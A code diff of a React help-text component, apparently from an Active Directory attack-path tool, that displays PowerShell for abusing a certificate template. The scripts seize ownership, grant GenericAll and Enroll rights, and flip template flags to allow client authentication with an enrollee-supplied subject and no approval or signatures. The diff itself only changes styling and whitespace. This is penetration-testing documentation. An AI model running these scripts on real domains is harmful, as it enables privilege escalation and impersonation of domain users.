@@ -17,10 +17,9 @@
 import { Typography } from '@mui/material';
 import { FC } from 'react';
 import CodeController from '../CodeController/CodeController';
-import { useHelpTextStyles } from '../utils';
+import { hasChildCodeElementsClasses } from '../utils';
 
 const WindowsAbuse: FC = () => {
-    const classes = useHelpTextStyles();
     const step0_1 = (
         <>
             <Typography variant='body2'>
@@ -35,11 +34,11 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Print the owner
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Owner`}
@@ -50,11 +49,11 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Set owner
                 $acl = $template.psbase.ObjectSecurity
                 $account = New-Object System.Security.Principal.NTAccount($principalName)
@@ -85,11 +84,11 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Construct the ACE
                 $account = New-Object System.Security.Principal.NTAccount($principalName)
                 $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
@@ -98,7 +97,7 @@ const WindowsAbuse: FC = () => {
                     [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                     [System.Security.AccessControl.AccessControlType]::Allow
                 )
-                
+
                 # Add the new ACE to the ACL
                 $acl = $template.psbase.ObjectSecurity
                 $acl.AddAccessRule($ace)
@@ -108,11 +107,11 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Print ACEs granted to the principal
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
@@ -121,11 +120,11 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Construct the ACE
                 $account = New-Object System.Security.Principal.NTAccount($principalName)
                 $sid = $account.Translate([System.Security.Principal.SecurityIdentifier])
@@ -134,7 +133,7 @@ const WindowsAbuse: FC = () => {
                     [System.DirectoryServices.ActiveDirectoryRights]::GenericAll,
                     [System.Security.AccessControl.AccessControlType]::Allow
                 )
-                
+
                 # Remove the ACE from the ACL
                 $acl = $template.psbase.ObjectSecurity
                 $acl.RemoveAccessRuleSpecific($ace)
@@ -145,7 +144,7 @@ const WindowsAbuse: FC = () => {
 
     const step1 = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 1: </b>Ensure the certificate template allows for client authentication.
                 <br />
                 <br />
@@ -160,7 +159,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -169,12 +168,12 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Print attributes
                 Write-Host "pKIExtendedKeyUsage: $($template.Properties["pKIExtendedKeyUsage"])"
                 Write-Host "msPKI-Certificate-Application-Policy: $($template.Pro`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                 principal.
@@ -185,7 +184,7 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -194,7 +193,7 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Add EKU to attributes
                 $template.Properties["pKIExtendedKeyUsage"].Add($eku) | Out-Null
                 $template.Properties["msPKI-Certificate-Application-Policy"].Add($eku) | Out-Null
@@ -210,7 +209,7 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $eku = "1.3.6.1.5.5.7.3.2"       # Client Authentication EKU
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -219,7 +218,7 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Remove EKU from attributes
                 $template.Properties["pKIExtendedKeyUsage"].Remove($eku) | Out-Null
                 $template.Properties["msPKI-Certificate-Application-Policy"].Remove($eku) | Out-Null
@@ -232,7 +231,7 @@ const WindowsAbuse: FC = () => {
 
     const step2 = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 2: </b>Ensure the certificate template requires enrollee to specify Subject Alternative Name
                 (SAN).
                 <br />
@@ -261,7 +260,7 @@ const WindowsAbuse: FC = () => {
                 $template = $searcher.FindOne().GetDirectoryEntry()
                 $msPKICertificateNameFlag = $template.Properties["msPKI-Certificate-Name-Flag"]
                 $ldap.Close()
-                
+
                 # Print attribute value and enabeld flags
                 $flagTable = @{
                     0x00000001 = "CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT"
@@ -285,13 +284,13 @@ const WindowsAbuse: FC = () => {
                     }
                 }`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Flip the <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> flag:
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $flagToFlip = 0x00000001         # CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -300,14 +299,14 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Flip flag
                 $curValue = $template.Properties["msPKI-Certificate-Name-Flag"].Value
                 $template.Properties["msPKI-Certificate-Name-Flag"].Value = $curValue -bxor $flagToFlip
                 $template.CommitChanges()
                 $ldap.Close()`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                 principal.
@@ -326,7 +325,7 @@ const WindowsAbuse: FC = () => {
 
     const step3 = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 3: </b>Ensure the certificate template does not require manager approval.
                 <br />
                 <br />
@@ -342,7 +341,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -353,7 +352,7 @@ const WindowsAbuse: FC = () => {
                 $template = $searcher.FindOne().GetDirectoryEntry()
                 $msPKICertificateNameFlag = $template.Properties["msPKI-Enrollment-Flag"]
                 $ldap.Close()
-                
+
                 # Print attribute value and enabeld flags
                 $flagTable = @{
                     0x00000001 = "CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS"
@@ -382,13 +381,13 @@ const WindowsAbuse: FC = () => {
                     }
                 }`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Flip the <code>CT_FLAG_PEND_ALL_REQUESTS</code> flag:
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $flagToFlip = 0x00000002         # CT_FLAG_PEND_ALL_REQUESTS
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -397,14 +396,14 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Flip flag
                 $curValue = $template.Properties["msPKI-Enrollment-Flag"].Value
                 $template.Properties["msPKI-Enrollment-Flag"].Value = $curValue -bxor $flagToFlip
                 $template.CommitChanges()
                 $ldap.Close()`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                 principal.
@@ -420,7 +419,7 @@ const WindowsAbuse: FC = () => {
     );
     const step4 = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 4: </b>Ensure the certificate template does not require authorized signatures.
                 <br />
                 <br />
@@ -435,7 +434,7 @@ const WindowsAbuse: FC = () => {
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -444,18 +443,18 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Print attribute
                 Write-Host "msPKI-RA-Signature: $($template.Properties["msPKI-RA-Signature"])"
                 $ldap.Close()`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 Set <code>msPKI-RA-Signature</code> to 0:
             </Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $noSignatures = [Int32]0
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $ldapPath = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
@@ -464,13 +463,13 @@ const WindowsAbuse: FC = () => {
                 $searcher.SearchRoot = $ldap
                 $searcher.Filter = "(&(objectClass=pKICertificateTemplate)(cn=$templateName))"
                 $template = $searcher.FindOne().GetDirectoryEntry()
-                
+
                 # Set No. of authorized signatures required
                 $template.Properties["msPKI-RA-Signature"].Value = $noSignatures
                 $template.CommitChanges()
                 $ldap.Close()`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 To run the LDAP query as another principal, replace <code>DirectoryEntry($ldapPath)</code> with{' '}
                 <code>DirectoryEntry($ldapPath, $ldapUsername, $ldapPassword)</code> to specify the credentials of the
                 principal.
@@ -487,7 +486,7 @@ const WindowsAbuse: FC = () => {
     );
     const step5 = (
         <>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2' className={hasChildCodeElementsClasses}>
                 <b>Step 5: </b>Ensure the principal has enrollment rights on the certificate template.
                 <br />
                 <br />
@@ -500,7 +499,7 @@ const WindowsAbuse: FC = () => {
                 WHERE x.name = "PRINCIPAL@DOMAIN.NAME" AND ct.name = "CERTTEMPLATE@DOMAIN.NAME"
                 RETURN p`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
+            <Typography variant='body2'>
                 If a path is returned, continue to the next step.
                 <br />
                 <br />
@@ -509,11 +508,11 @@ const WindowsAbuse: FC = () => {
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Construct the ACE
                 $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                 $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
@@ -527,38 +526,34 @@ const WindowsAbuse: FC = () => {
                     [System.Security.AccessControl.InheritanceFlags]::None,
                     $inheritedObjectTypeByteArray
                 )
-                
+
                 # Add the new ACE to the ACL
                 $acl = $template.psbase.ObjectSecurity
                 $acl.AddAccessRule($ace)
                 $template.psbase.CommitChanges()`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
-                Confirm that the Enroll ACE was added:
-            </Typography>
+            <Typography variant='body2'>Confirm that the Enroll ACE was added:</Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Print ACEs granted to the principal
                 $acl = $template.psbase.ObjectSecurity
                 $acl.Access | ? { $_.IdentityReference -like "*$principalName" }`}
             </CodeController>
-            <Typography variant='body2' className={classes.containsCodeEl}>
-                After abuse, remove the Enroll ACE you added:
-            </Typography>
+            <Typography variant='body2'>After abuse, remove the Enroll ACE you added:</Typography>
             <CodeController>
                 {`$templateName = "TemplateName"   # Use CN, not display name
                 $principalName = "principal"     # SAM account name of principal
-                
+
                 # Find the certificate template
                 $rootDSE = New-Object DirectoryServices.DirectoryEntry("LDAP://RootDSE")
                 $template = [ADSI]"LDAP://CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$($rootDSE.configurationNamingContext)"
-                
+
                 # Construct the ACE
                 $objectTypeByteArray = [GUID]"0e10c968-78fb-11d2-90d4-00c04f79dc55"
                 $inheritedObjectTypeByteArray = [GUID]"00000000-0000-0000-0000-000000000000"
@@ -572,7 +567,7 @@ const WindowsAbuse: FC = () => {
                     [System.Security.AccessControl.InheritanceFlags]::None,
                     $inheritedObjectTypeByteArray
                 )
-                
+
                 # Remove the ACE from the ACL
                 $acl = $template.psbase.ObjectSecurity
                 $acl.RemoveAccessRuleSpecific($ace)
